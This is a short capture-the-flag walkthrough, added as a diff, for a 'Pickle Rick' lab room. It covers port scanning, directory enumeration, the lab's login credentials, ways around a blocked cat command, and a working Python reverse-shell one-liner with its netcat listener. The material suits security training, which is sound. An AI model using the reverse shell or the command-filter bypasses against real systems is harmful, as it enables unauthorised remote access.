@@ -1,0 +1,80 @@
+Pickle Rick Room
+
+Date: 13 December 2024
+Time: 13:59
+1. Initial Nmap Scan
+bash
+
+nmap -A -F -oN nmappickle.txt 10.10.103.128
+
+Quick Scan:
+bash
+
+nmap -Pn -F [IP]
+
+Filter Open Ports:
+bash
+
+cat nmappickle.txt | grep "open"
+
+2. Web Inspection
+
+    Visited Rick's page → View Page Source.
+
+    Found username: R1ckRul3s.
+
+Directory Enumeration with Gobuster:
+bash
+
+gobuster dir -u "10.10.103.128" -w /usr/share/wordlists/dirb/common.txt -t 64
+
+    Discovered a text file (potential password).
+
+3. Login Credentials
+
+    Username: R1ckRul3s
+
+    Password: Wubbalubbadubdub
+
+    Login URL: http://10.10.103.128/login.php
+
+4. Bypassing Restricted Commands
+
+If cat is blocked, use these alternatives:
+bash
+
+# Method 1
+while read line; do echo $line; done < textfile
+
+# Method 2
+grep . clue.txt
+
+# Method 3 (recursive)
+grep -R .  # Searches all files in the web directory.
+
+5. Reverse Shell
+
+Cheat Sheet: PentestMonkey Reverse Shell Cheat Sheet
+
+SSH Port Open?
+bash
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.27.206",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Find Your VM IP:
+bash
+
+ip addr show tun0  # Example: 10.9.255.4
+
+Execute on Web Command Line → Start Listener:
+bash
+
+nc -lvnp 9999
+
+Success! You’re in.
+6. Post-Exploitation
+
+Reading Files When cat Fails:
+bash
+
+cat *  # Outputs all files in the current directory.
